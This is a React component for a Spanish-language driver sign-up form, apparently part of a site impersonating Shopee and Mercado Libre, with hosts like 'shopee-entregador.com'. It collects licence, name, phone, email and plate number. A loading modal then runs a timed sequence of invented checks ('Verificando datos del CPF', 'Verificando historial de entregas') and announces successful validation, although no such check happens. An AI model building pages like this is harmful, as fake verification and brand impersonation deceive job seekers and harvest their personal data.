import React, { useState, useEffect } from 'react';
import { useLocation, useRoute } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useDebounce } from 'use-debounce';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import Breadcrumb from '@/components/Breadcrumb';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { VehicleInfoBox } from '@/components/VehicleInfoBox';

import shopeeMotoImage from '../assets/shopee-moto.webp';
import shopeeCarsImage from '../assets/shopee-cars.webp';

import CARROS___ESCOLHA from "@assets/CARROS_-_ESCOLHA.png";

import MOTO___ESCOLHA from "@assets/MOTO_-_ESCOLHA.png";

const formSchema = z.object({
  cpf: z.string()
    .min(1, "Número de licencia requerido"),
  nome: z.string().min(3, "Nombre debe tener al menos 3 caracteres"),
  telefone: z.string()
    .min(1, "Teléfono requerido"),
  email: z.string().email("Email inválido"),
  placa: z.string()
    .min(1, "Placa del vehículo requerida"),
});

type FormValues = z.infer<typeof formSchema>;

enum TipoVeiculo {
  CARRO = "carro",
  MOTO = "moto",
}

const Cadastro: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [tipoVeiculo, setTipoVeiculo] = useState<TipoVeiculo | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [isLoadingVehicleInfo, setIsLoadingVehicleInfo] = useState(false);
  const [vehicleIsValid, setVehicleIsValid] = useState(false);
  const [vehicleInfo, setVehicleInfo] = useState<{
    marca?: string;
    modelo?: string;
    ano?: string;
    anoModelo?: string;
    chassi?: string;
    cor?: string;
  } | null>(null);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  const { 
    register, 
    handleSubmit, 
    formState: { errors },
    setValue,
    watch
  } = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      cpf: '',
      nome: '',
      telefone: '',
      email: '',
      placa: '',
    }
  });

  const placaValue = watch('placa');
  const [debouncedPlaca] = useDebounce(placaValue, 1000);
  
  // Efeito para buscar informações do veículo quando a placa mudar
  useEffect(() => {
    if (debouncedPlaca && debouncedPlaca.length >= 7) {
      fetchVehicleInfo(debouncedPlaca);
    }
  }, [debouncedPlaca]);



  // Formatação da placa no formato XXX-0000 (antigo) ou AAA0A00 (Mercosul)
  const formatPlaca = (value: string) => {
    value = value.toUpperCase();
    const cleanValue = value.replace(/[^A-Z0-9]/g, '');
    
    if (cleanValue.length <= 3) {
      return cleanValue;
    } else if (cleanValue.length === 7) {
      // Verifica se é formato antigo (3 letras + 4 números)
      if (/^[A-Z]{3}[0-9]{4}$/.test(cleanValue)) {
        // Formato antigo XXX-0000
        return `${cleanValue.slice(0, 3)}-${cleanValue.slice(3)}`;
      } 
      // Formato Mercosul
      else if (/^[A-Z]{3}[0-9][A-Z][0-9]{2}$/.test(cleanValue)) {
        // Não formata com hífen, apenas retorna
        return cleanValue;
      }
      // Outro formato de 7 caracteres - aplica o hífen comum
      else {
        return `${cleanValue.slice(0, 3)}-${cleanValue.slice(3)}`;
      }
    } else {
      // Para outros comprimentos, retorna o valor limpo
      return cleanValue;
    }
  };



  const handlePlacaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPlaca(e.target.value);
    setValue('placa', formatted);
  };

  // Obter a URL base da API do backend dependendo do ambiente
  const getApiBaseUrl = () => {
    // Em desenvolvimento, usa a URL relativa
    if (window.location.hostname.includes('localhost') || 
        window.location.hostname.includes('replit.dev')) {
      return '';
    }
    
    // Em produção, usa a URL absoluta do backend Heroku
    return 'https://disparador-f065362693d3.herokuapp.com';
  };
  
  // Função para buscar informações do veículo pela placa
  const fetchVehicleInfo = async (placa: string) => {
    if (!placa || placa.length < 7) {
      setVehicleInfo(null);
      return;
    }

    // Limpar a placa - remover hífen para consulta
    const cleanedPlaca = placa.replace('-', '');
    
    if (cleanedPlaca.length < 7) {
      return;
    }

    try {
      setIsLoadingVehicleInfo(true);
      
      // Determinar ambiente (produção vs desenvolvimento)
      const hostname = window.location.hostname;
      const isProduction = hostname.includes('netlify.app') || 
                          hostname.includes('shopee-parceiro.com') ||
                          hostname === 'shopee-entregador.com';
      
      console.log(`[DEBUG] Ambiente: ${isProduction ? 'Produção' : 'Desenvolvimento'}, Host: ${hostname}`);
      
      let vehicleData = null;
      
      // MÉTODO 1: Em produção, SEMPRE usar o proxy Netlify primeiro
      if (isProduction) {
        try {
          console.log('[DEBUG] Usando proxy Netlify para consulta de placa');
          // Usar caminho relativo à raiz do site
          const proxyUrl = `/vehicle-api/${cleanedPlaca}`;
          console.log(`[DEBUG] URL do proxy: ${proxyUrl}`);
          
          const proxyResponse = await fetch(proxyUrl, {
            method: 'GET',
            // Garantir que estamos usando o modo de CORS default
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            }
          });
          
          if (proxyResponse.ok) {
            vehicleData = await proxyResponse.json();
            console.log('[INFO] Dados do veículo obtidos via proxy Netlify:', vehicleData);
          } else {
            const errorStatus = proxyResponse.status;
            console.warn(`[AVISO] Proxy falhou com status: ${errorStatus}`);
            
            if (errorStatus === 404) {
              // Possível problema nos redirecionamentos do Netlify
              console.log('[DEBUG] Tentando URL alternativa no Netlify');
              // Tentar com o caminho completo para a função
              const altProxyUrl = `/.netlify/functions/vehicle-proxy/${cleanedPlaca}`;
              
              const altResponse = await fetch(altProxyUrl, {
                method: 'GET',
                headers: {
                  'Accept': 'application/json'
                }
              });
              
              if (altResponse.ok) {
                vehicleData = await altResponse.json();
                console.log('[INFO] Dados obtidos via caminho alternativo do Netlify:', vehicleData);
              } else {
                console.error('[ERRO] Caminho alternativo do Netlify também falhou:', altResponse.status);
              }
            }
          }
        } catch (proxyError) {
          console.error('[ERRO] Falha ao consultar via proxy:', proxyError);
        }
      }
      
      // MÉTODO 2: Em desenvolvimento, tentar API direta (ou como fallback em produção)
      if (!vehicleData && (!isProduction || (isProduction && localStorage.getItem('allow_direct_api') === 'true'))) {
        const apiKey = import.meta.env.VITE_VEHICLE_API_KEY;
        
        if (apiKey) {
          try {
            console.log('[DEBUG] Tentando consulta direta à API de veículos');
            const headers = new Headers();
            const authValue = apiKey.startsWith('Bearer ') ? apiKey : `Bearer ${apiKey}`;
            headers.append('Authorization', authValue);
            
            const apiUrl = `https://wdapi2.com.br/consulta/${cleanedPlaca}`;
            console.log(`[DEBUG] URL da API direta: ${apiUrl}`);
            
            const directResponse = await fetch(apiUrl, { 
              method: 'GET',
              headers: headers
            });
            
            if (directResponse.ok) {
              vehicleData = await directResponse.json();
              console.log('[INFO] Dados do veículo obtidos via API direta');
            } else if (!apiKey.startsWith('Bearer ')) {
              // Tentar sem o prefixo Bearer
              console.log('[DEBUG] Tentando novamente sem prefixo Bearer');
              const headersWithoutBearer = new Headers();
              headersWithoutBearer.append('Authorization', apiKey);
              
              const retryResponse = await fetch(apiUrl, {
                method: 'GET',
                headers: headersWithoutBearer
              });
              
              if (retryResponse.ok) {
                vehicleData = await retryResponse.json();
                console.log('[INFO] Dados do veículo obtidos via API direta (sem Bearer)');
              } else {
                console.warn('[AVISO] Consulta direta falhou em todas as tentativas');
              }
            }
          } catch (apiError) {
            console.error('[ERRO] Falha ao consultar API direta:', apiError);
          }
        } else {
          console.warn('[AVISO] API Key não disponível para consulta direta');
        }
      }
      
      // MÉTODO 3: Fallback para backend Heroku (DESATIVADO EM PRODUÇÃO por causa do CORS)
      if (!vehicleData && !isProduction) {
        try {
          console.log('[DEBUG] Tentando consultar via backend Heroku');
          const apiUrl = `${getApiBaseUrl()}/api/vehicle-info/${cleanedPlaca}`;
          const backendResponse = await fetch(apiUrl);
          
          if (backendResponse.ok) {
            vehicleData = await backendResponse.json();
            console.log('[INFO] Dados do veículo obtidos via backend Heroku');
          } else {
            console.error('[ERRO] Backend falhou, status:', backendResponse.status);
          }
        } catch (backendError) {
          console.error('[ERRO] Falha ao consultar backend:', backendError);
        }
      }
      
      // Processar os dados obtidos
      if (vehicleData) {
        setVehicleInfo({
          marca: vehicleData.MARCA || vehicleData.marca || "Não informado",
          modelo: vehicleData.MODELO || vehicleData.modelo || "Não informado",
          ano: vehicleData.ano || vehicleData.anoModelo || "Não informado",
          anoModelo: vehicleData.anoModelo || "Não informado",
          chassi: vehicleData.chassi || "Não informado", 
          cor: vehicleData.cor || "Não informado"
        });
      } else {
        console.error('[ERRO] Todas as tentativas de obter dados do veículo falharam');
        setVehicleInfo(null);
      }
    } catch (error) {
      console.error('Erro ao buscar informações do veículo:', error);
      setVehicleInfo(null);
    } finally {
      setIsLoadingVehicleInfo(false);
    }
  };

  // Limpar o campo de placa e informações do veículo
  const handleClearPlate = () => {
    setValue('placa', '');
    setVehicleInfo(null);
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a próxima página
    navigate('/municipios');
  };

  const onSubmit = async (data: FormValues) => {
    if (!tipoVeiculo) {
      toast({
        title: "Erro de validação",
        description: "Selecione o tipo de veículo (Carro ou Moto)",
        variant: "destructive",
      });
      return;
    }

    if (!cepData) {
      toast({
        title: "Erro de validação",
        description: "Informações de CEP não encontradas. Por favor, recarregue a página.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Armazenar dados no localStorage para uso posterior
      const candidatoData = {
        ...data,
        tipoVeiculo,
        estado: cepData.state,
        cidade: cepData.city,
        cep: cepData.cep,
      };

      localStorage.setItem('candidato_data', JSON.stringify(candidatoData));
      
      // Salvar os dados do usuário para mostrar na página de entrega
      localStorage.setItem('user_data', JSON.stringify({
        nome: data.nome,
        cpf: data.cpf
      }));
      
      // Mostrar o modal de carregamento em vez de navegar diretamente
      setShowLoadingModal(true);
      
    } catch (error) {
      setIsSubmitting(false);
      toast({
        title: "Erro no cadastro",
        description: "Ocorreu um erro ao processar seu cadastro. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      <Breadcrumb />
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mt-[-27px] mb-[-27px]">
          <h1 className="font-loewe-next-heading text-center mb-8 text-gray-800 text-[24px]">Registro de Socio Conductor</h1>
          
          <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
            <div className="space-y-4">
              <div>
                <label htmlFor="cpf" className="block text-base font-loewe-next-body font-medium text-gray-800 mb-2">Licencia de conducir</label>
                <Input
                  id="cpf"
                  {...register('cpf')}
                  placeholder="Insertar número de licencia"
                  className={errors.cpf ? 'border-red-500' : ''}
                />
                {errors.cpf && (
                  <p className="mt-1 text-sm text-red-600">{errors.cpf.message}</p>
                )}
              </div>

              <div>
                <label htmlFor="nome" className="block text-base font-loewe-next-body font-medium text-gray-800 mb-2">
                  Nombre Completo
                </label>
                <Input
                  id="nome"
                  {...register('nome')}
                  placeholder="Escribe tu nombre completo"
                  className={errors.nome ? 'border-red-500' : ''}
                />
                {errors.nome && (
                  <p className="mt-1 text-sm text-red-600">{errors.nome.message}</p>
                )}
              </div>

              <div>
                <label htmlFor="telefone" className="block text-base font-loewe-next-body font-medium text-gray-800 mb-2">
                  Teléfono
                </label>
                <Input
                  id="telefone"
                  {...register('telefone')}
                  placeholder="Insertar número de teléfono"
                  className={errors.telefone ? 'border-red-500' : ''}
                />
                {errors.telefone && (
                  <p className="mt-1 text-sm text-red-600">{errors.telefone.message}</p>
                )}
              </div>

              <div>
                <label htmlFor="email" className="block text-base font-loewe-next-body font-medium text-gray-800 mb-2">
                  E-mail
                </label>
                <Input
                  id="email"
                  type="email"
                  {...register('email')}
                  placeholder="tu@email.com"
                  className={errors.email ? 'border-red-500' : ''}
                />
                {errors.email && (
                  <p className="mt-1 text-sm text-red-600">{errors.email.message}</p>
                )}
              </div>

              <div className="pt-4">
                <label className="block text-lg font-loewe-next-heading font-medium text-gray-800 mb-4">
                  ¿Qué vehículo utilizas?
                </label>
                <div className="grid grid-cols-2 gap-4">
                  <button
                    type="button"
                    onClick={() => setTipoVeiculo(TipoVeiculo.CARRO)}
                    className={`flex flex-col items-center justify-center p-6 ${
                      tipoVeiculo === TipoVeiculo.CARRO
                        ? 'border-[#FEE80D] border-3 bg-[#FFFEF0]'
                        : 'border-gray-200 border-2 bg-white hover:bg-gray-50'
                    } rounded-lg transition-colors`}
                  >
                    <div className="mb-3 h-24 flex items-center justify-center">
                      <img src={CARROS___ESCOLHA} alt="Carros Shopee" className="h-full w-auto object-contain" />
                    </div>
                    <span className={`font-loewe-next-body font-medium ${
                      tipoVeiculo === TipoVeiculo.CARRO ? 'text-[#FEE80D]' : 'text-gray-700'
                    }`}>
                      Auto
                    </span>
                  </button>
                  
                  <button
                    type="button"
                    onClick={() => setTipoVeiculo(TipoVeiculo.MOTO)}
                    className={`flex flex-col items-center justify-center p-6 ${
                      tipoVeiculo === TipoVeiculo.MOTO
                        ? 'border-[#FEE80D] border-3 bg-[#FFFEF0]'
                        : 'border-gray-200 border-2 bg-white hover:bg-gray-50'
                    } rounded-lg transition-colors`}
                  >
                    <div className="mb-3 h-20 flex items-center justify-center">
                      <img src={MOTO___ESCOLHA} alt="Moto Shopee" className="h-full object-contain" />
                    </div>
                    <span className={`font-loewe-next-body font-medium ${
                      tipoVeiculo === TipoVeiculo.MOTO ? 'text-[#FEE80D]' : 'text-gray-700'
                    }`}>
                      Moto
                    </span>
                  </button>
                </div>
              </div>

              <div className="pt-2">
                <label htmlFor="placa" className="block text-base font-loewe-next-body font-medium text-gray-800 mb-2">
                  Placa del Vehículo
                </label>
                <div className="relative">
                  <Input
                    id="placa"
                    {...register('placa')}
                    onChange={handlePlacaChange}
                    placeholder="Ingresa la placa de tu vehículo"
                    className={`${errors.placa ? 'border-red-500' : ''} ${isLoadingVehicleInfo ? 'pr-10' : ''}`}
                    inputMode="text"
                    type="search" 
                    autoCapitalize="characters"
                  />
                  {isLoadingVehicleInfo && (
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <div className="animate-spin h-4 w-4 border-2 border-[#3483FA] border-t-transparent rounded-full"></div>
                    </div>
                  )}
                </div>
                {errors.placa && (
                  <p className="mt-1 text-sm text-red-600">{errors.placa.message}</p>
                )}
                
                {/* Área para mostrar as informações do veículo usando o componente VehicleInfoBox */}
                <div className="mt-3">
                  <div className="mb-2">
                    <h3 className="font-loewe-next-heading font-medium text-gray-800">Información del Vehículo</h3>
                  </div>
                  
                  {/* Usar o componente VehicleInfoBox */}
                  <VehicleInfoBox
                    licensePlate={placaValue}
                    onChange={(isValid) => {
                      // Se o veículo é válido, atualizar o estado
                      if (isValid) {
                        // O componente já buscará as informações do veículo
                        setIsLoadingVehicleInfo(false);
                      }
                    }}
                    className="w-full"
                  />
                </div>
              </div>
            </div>

            <Button
              type="submit"
              className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-loewe-next-body font-medium py-6 text-base rounded-[3px]"
              disabled={isSubmitting}
              style={{ height: '50px' }}
            >
              {isSubmitting ? 'Procesando...' : 'Continuar'}
            </Button>
          </form>
        </div>
      </div>
      <Footer />
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Verificando Registro"
        loadingSteps={[
          "Verificando datos del CPF",
          "Consultando Licencia de Conducir",
          "Validando documentación del vehículo",
          "Analizando disponibilidad en la región",
          "Verificando historial de entregas"
        ]}
        completionMessage="¡Tus datos han sido validados exitosamente! Estás habilitado para ser un Socio Conductor de Mercado Libre."
        loadingTime={7000}
      />
    </div>
  );
};

export default Cadastro;